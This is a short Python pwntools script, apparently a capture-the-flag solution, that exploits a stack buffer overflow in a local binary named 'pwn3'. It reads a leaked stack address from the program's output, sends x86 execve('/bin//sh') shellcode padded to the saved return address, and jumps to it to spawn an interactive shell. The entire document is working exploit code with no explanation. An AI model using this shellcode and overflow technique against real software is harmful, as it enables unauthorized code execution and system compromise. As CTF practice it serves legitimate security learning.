#!/usr/bin/python3

from pwn import *

target = process('./pwn3')

shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

prompt = target.recvline()
stack_addr = prompt.split(b'journey ')[1].rstrip(b'!\n')
stack_addr = int(stack_addr, 16)
print(hex(stack_addr))

payload = shellcode
payload += b'A' * (0x12e - len(shellcode))
payload += p32(stack_addr)

target.sendline(payload)
target.interactive()
